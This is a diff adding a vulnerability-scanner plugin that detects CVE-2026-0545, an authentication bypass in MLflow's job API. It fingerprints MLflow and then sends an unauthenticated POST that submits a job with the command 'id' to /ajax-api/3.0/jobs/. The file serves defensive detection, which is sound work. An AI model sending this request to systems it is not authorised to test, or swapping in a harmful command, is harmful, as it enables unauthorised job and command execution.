@@ -1,0 +1,91 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "MLflow_CVE_2026_0545"
+  author: "dyeddala"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2026-0545"
+  }
+  severity: CRITICAL
+  title: "MLflow Job API - Authentication Bypass"
+  description: "MLflow latest version contains an authentication bypass caused by unprotected FastAPI job endpoints under /ajax-api/3.0/jobs/* when basic-auth is enabled, letting unauthenticated network clients submit and manage jobs, exploit requires job execution enabled and allowlisted job functions."
+  recommendation: "Update to the latest version with fixed authentication enforcement on job endpoints."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2026-0545"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_mlflow"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 401
+      expect_any: {
+        conditions: [
+          { body: {} contains: "mlflow" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "mlflow_job_api_bypass_exploit"
+  http_request: {
+    method: POST
+    uri: "/ajax-api/3.0/jobs/"
+    headers: [
+      {
+        name: "Content-Type"
+        value: "application/json"
+      }
+    ]
+    data: "{\"job_name\":\"run_task\",\"params\":{\"command\":\"id\"}}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          {
+            body: {}
+            contains: "\"job_id\":"
+          },
+          {
+            body: {}
+            contains: "\"job_name\":"
+          }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "fingerprint_mlflow",
+    "mlflow_job_api_bypass_exploit"
+  ]
+}
